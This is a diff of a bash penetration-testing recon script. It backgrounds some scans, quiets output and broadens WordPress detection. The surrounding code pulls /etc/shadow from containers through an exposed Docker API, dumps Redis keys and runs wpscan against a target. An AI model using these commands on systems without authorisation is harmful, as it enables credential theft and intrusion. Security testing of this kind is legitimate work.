@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20171208 Kirby
+# 20171212 Kirby
 
 
 umask 077
@@ -137,7 +137,7 @@ function MAIN()
         if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//redis/'
         then
             echo "starting redisScan"
-            redisScan $port 
+            redisScan $port &
         fi
     
         # ldap
@@ -151,7 +151,7 @@ function MAIN()
         if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//http//Elasticsearch'
         then
             echo "starting elasticsearchScan"
-            elasticsearchScan $port
+            elasticsearchScan $port &
         fi
     
         # iscsi
@@ -922,7 +922,7 @@ function dockerScan()
             >> "$RECONDIR"/dockerchanges.${id}
         $TIMEOUT 60 curl "http://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
             2>/dev/null|tar xf - -O \
-            >> "$RECONDIR"/dockershadow.${id}
+            >> "$RECONDIR"/dockershadow.${id} 2>/dev/null
 
     done
 
@@ -970,7 +970,7 @@ function redisScan()
     for i in {0..16}
     do
         $TIMEOUT 90 redis-cli -h $TARGET -p $port -n $i --scan \
-            >> "$RECONDIR"/${TARGET}.redis 2>&1
+            >> "$RECONDIR"/${TARGET}.redis.$port 2>&1
     done
 
     return 0
@@ -1195,7 +1195,7 @@ function getHeaders()
     do 
         echo "##################################################" >> "$RECONDIR"/${TARGET}.headers 2>&1
         echo "$url" >> "$RECONDIR"/${TARGET}.headers
-        $TIMEOUT 30 wget -O /dev/null --no-check-certificate -S  -D $TARGET --method=OPTIONS "$url" \
+        $TIMEOUT 30 wget -q -O /dev/null --no-check-certificate -S  -D $TARGET --method=OPTIONS "$url" \
             >> "$RECONDIR"/${TARGET}.headers 2>&1
     done
 
@@ -1530,7 +1530,7 @@ function scanURLs()
     done
 
     # run wpscan on first found wordpress
-    for url in $(grep -i wordpress "$RECONDIR"/${TARGET}.whatweb 2>/dev/null |head -1 |awk '{print $1}')
+    for url in $(egrep -i 'wordpress|/wp' "$RECONDIR"/${TARGET}.whatweb 2>/dev/null |head -1 |awk '{print $1}')
     do
         $TIMEOUT 900 wpscan -t 10 --follow-redirection --disable-tls-checks -e \
             --no-banner --no-color --batch --url "$url" > "$RECONDIR"/${TARGET}.wpscan 2>&1 &
